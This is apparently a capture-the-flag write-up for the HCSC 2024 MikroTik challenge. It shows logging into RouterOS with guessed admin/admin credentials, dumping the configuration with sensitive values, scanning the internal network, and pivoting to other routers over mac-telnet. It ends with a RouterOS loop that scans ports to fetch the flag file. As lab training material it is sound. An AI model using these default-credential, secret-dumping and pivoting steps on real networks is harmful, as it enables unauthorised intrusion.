# HCSC 2024 - Csak egy litván hálózat

## Description

Volt egyszer egy cég Európában, Litvániában, akik álmodtak egy nagyot.

Méltatlanul alulreprezentált a népszerűségük, holott minden téren felvehetik a versenyt a nagy gyártókkal.
De mire is képesek ők?
A kihívás során elképesztő hálózati megoldásokkal találkozhatsz. Olyan magasságokat is láthatsz, ahová nem kell a lift.

Készítői kommentek:
* a megoldáshoz brute-force nem szükséges
* Kellékek a megoldáshoz: VPN hozzáférés
* a challenge alapvetően egyetlen porton fut, de ez nem jelenti azt, hogy a teljes challenge során egy portot is kell használni

**Flag formátum**: `HCSC24{...}` ahol a '...' helyén szerepel a flag.

*By [TheAdam](https://github.com/adns44)*

> Hint 1 (cost 0): /tool/push és utálom a szomszédaim, de mindig megtalálom őket

> Hint 2 (cost 175): Portb 11111101000

## Metadata

- Tags: `mikrotik`, `networking`, `mac-telnet`
- Points: `350`
- Number of solvers: `4`
- Filename: -

## Solution

**I needed the two hints to solve this challenge.**

The challenge was running on `10.10.(1-9).10:32860`. Nmap says the following:

```
32860/tcp open     ssh     MikroTik RouterOS sshd (protocol 2.0)
```

Let's try to `SSH` in and guess that the credentials are `admin`/`admin`:

```
$ ssh admin@10.10.5.10 -p 32860
  MMM      MMM       KKK                          TTTTTTTTTTT      KKK
  MMMM    MMMM       KKK                          TTTTTTTTTTT      KKK
  MMM MMMM MMM  III  KKK  KKK  RRRRRR     OOOOOO      TTT     III  KKK  KKK
  MMM  MM  MMM  III  KKKKK     RRR  RRR  OOO  OOO     TTT     III  KKKKK
  MMM      MMM  III  KKK KKK   RRRRRR    OOO  OOO     TTT     III  KKK KKK
  MMM      MMM  III  KKK  KKK  RRR  RRR   OOOOOO      TTT     III  KKK  KKK

  MikroTik RouterOS 7.13.5 (c) 1999-2024       https://www.mikrotik.com/

Press F1 for help

[admin@hcsc-main-1] >
```

It worked, we are in a Miktorik router.

Unfortunately, we are a `read-only` user, we cannot modify the configuration, however, we can execute many useful commands like: `/export show-sensitive verbose` which prints almost all the relevant details about the router ([`hcsc-main-1.conf`](files/hcsc-main-1.conf)).

SSH port forwarding is disabled, so we cannot do dynamic port forwarding + socks + proxychains...

If we check the interfaces, it is interesting that there are two of the: `ether1` and `ether3`. If we run `mac-scan` and `ip-scan` tools we can find some internal devices in the `192.168.1.0/24` range:

```
[admin@hcsc-main-1] > interface ethernet print
Flags: R - RUNNING
Columns: NAME, MTU, MAC-ADDRESS, ARP
#   NAME     MTU  MAC-ADDRESS        ARP
0 R ether1  1500  52:54:00:12:34:56  enabled
1 R ether3  1500  52:54:00:12:34:51  enabled

[admin@hcsc-main-1] > tool mac-scan
interface: ether3
Columns: MAC-ADDRESS, ADDRESS, AGE
MAC-ADDRESS        ADDRESS        AGE
52:54:00:12:34:56  192.168.1.1     18
52:54:00:12:34:11  192.168.1.200   15
52:54:00:12:34:51  0.174.0.0       18

[admin@hcsc-main-1] > tool ip-scan
address-range     as-value     duration     freeze-frame-interval     interface     without-paging

[admin@hcsc-main-1] > tool ip-scan address-range=192.168.1.0/24
Columns: ADDRESS, MAC-ADDRESS
ADDRESS        MAC-ADDRESS
192.168.1.1    52:54:00:12:34:56
192.168.1.42   6A:8F:E2:47:8D:B2
192.168.1.200  52:54:00:12:34:11
```

The IP address `192.168.1.42` looks interesting, as it has a completely different MAC address as the other devices. 

What is very very confusing is that our current router has the MAC address of `52:54:00:12:34:56` and the device at `192.168.1.1` also has the same MAC address, but it is a different device. Our device does not have any IP address on the `ether3` interface:

```
[admin@hcsc-main-1] > ip address print
Flags: D - DYNAMIC
Columns: ADDRESS, NETWORK, INTERFACE
#   ADDRESS       NETWORK   INTERFACE
0 D 10.0.2.15/24  10.0.2.0  ether1
```

Because of this we cannot communicate with the devices on an IP level, but we might be able to use `mac-telnet` to login to the other devices.

> MAC telnet is used to provide access to a router that has no IP address set. It works just like IP telnet. MAC telnet is possible between two MikroTik RouterOS routers only.

```
[admin@hcsc-main-1] > tool mac-telnet 6A:8F:E2:47:8D:B2
Login: admin
Password:
Trying 6A:8F:E2:47:8D:B2...

Welcome back!
[admin@hcsc-main-1] > tool mac-telnet 52:54:00:12:34:11
Login: admin
Password:
Trying 52:54:00:12:34:11...
Connected to 52:54:00:12:34:11


  MMM      MMM       KKK                          TTTTTTTTTTT      KKK
  MMMM    MMMM       KKK                          TTTTTTTTTTT      KKK
  MMM MMMM MMM  III  KKK  KKK  RRRRRR     OOOOOO      TTT     III  KKK  KKK
  MMM  MM  MMM  III  KKKKK     RRR  RRR  OOO  OOO     TTT     III  KKKKK
  MMM      MMM  III  KKK KKK   RRRRRR    OOO  OOO     TTT     III  KKK KKK
  MMM      MMM  III  KKK  KKK  RRR  RRR   OOOOOO      TTT     III  KKK  KKK

  MikroTik RouterOS 7.13.5 (c) 1999-2024       https://www.mikrotik.com/

Press F1 for help

[admin@hcsc-internal-client] >
```

We could log in to `192.168.1.200` with `admin` / `admin`. However, we cannot go further because of the restrictive firewall rule, but we can `ping` the other two devices:

```
[admin@hcsc-internal-client] > :for i from=1 to=256 do={ /ping "192.168.1.$i" count=1 }
Columns: SEQ, HOST, SIZE, TTL, TIME
SEQ  HOST         SIZE  TTL  TIME
  0  192.168.1.1    56   64  15ms510us
[...]
Columns: SEQ, HOST, SIZE, TTL, TIME
SEQ  HOST          SIZE  TTL  TIME
  0  192.168.1.42    56   64  5ms153us
[...]

[admin@hcsc-internal-client] > ip firewall filter print
Flags: X - disabled, I - invalid; D - dynamic
 0    chain=output action=drop protocol=tcp
```

Let's try to login to `192.168.1.1` (`admin` / `admin`):

```
[admin@hcsc-main-1] > tool mac-telnet 52:54:00:12:34:56
Login: admin
Password:
Trying 52:54:00:12:34:56...
Connected to 52:54:00:12:34:56


  MMM      MMM       KKK                          TTTTTTTTTTT      KKK
  MMMM    MMMM       KKK                          TTTTTTTTTTT      KKK
  MMM MMMM MMM  III  KKK  KKK  RRRRRR     OOOOOO      TTT     III  KKK  KKK
  MMM  MM  MMM  III  KKKKK     RRR  RRR  OOO  OOO     TTT     III  KKKKK
  MMM      MMM  III  KKK KKK   RRRRRR    OOO  OOO     TTT     III  KKK KKK
  MMM      MMM  III  KKK  KKK  RRR  RRR   OOOOOO      TTT     III  KKK  KKK

  MikroTik RouterOS 7.13.5 (c) 1999-2024       https://www.mikrotik.com/

Press F1 for help

[admin@hcsc-internal-main] > interface print
Flags: R - RUNNING
Columns: NAME, TYPE, ACTUAL-MTU, MAC-ADDRESS
#   NAME    TYPE   ACTUAL-MTU  MAC-ADDRESS
0 R ether1  ether        1500  52:54:00:12:34:56

[admin@hcsc-internal-main] > ip address print
Columns: ADDRESS, NETWORK, INTERFACE
# ADDRESS         NETWORK      INTERFACE
0 192.168.1.1/24  192.168.1.0  ether1

[admin@hcsc-internal-main] > ip firewall export
# 2024-05-02 23:04:10 by RouterOS 7.13.5
# software id =
#
```

There are no firewall restrictions!!! We can now try to communicate with `192.168.1.42`. Let's run a short script to determine whether it has any `HTTP` ports open:

```
[admin@hcsc-internal-main] > :for i from=1 to=65535 do={ :do { /tool/fetch output=user http-method=get url="http://192.168.1.42:$i/" } on-error={ :put $i } }
2023
      status: finished
  downloaded: 0KiB
    duration: 0s
        data: <html> <head><title>Index of /</title></head> <body> <h1>Index of /</h1><hr><pre><a href="../">../</a> <a href="flag.txt">flag.txt</a> 27-Apr-2024 07:49 44
              </pre><hr></body> </html>
  status: failed
2025
```

Port 2024 is open and there is `/flag.txt` file, let's download is:

```
[admin@hcsc-internal-main] > /tool fetch url="http://192.168.1.42:2024/flag.txt" output=user
      status: finished
  downloaded: 0KiBse]
       total: 0KiB
    duration: 1s
        data: HCSC24{ROUTEROS-IS-THE-NEAREST-TO-THE-B1ST}
```

Flag: `HCSC24{ROUTEROS-IS-THE-NEAREST-TO-THE-B1ST}`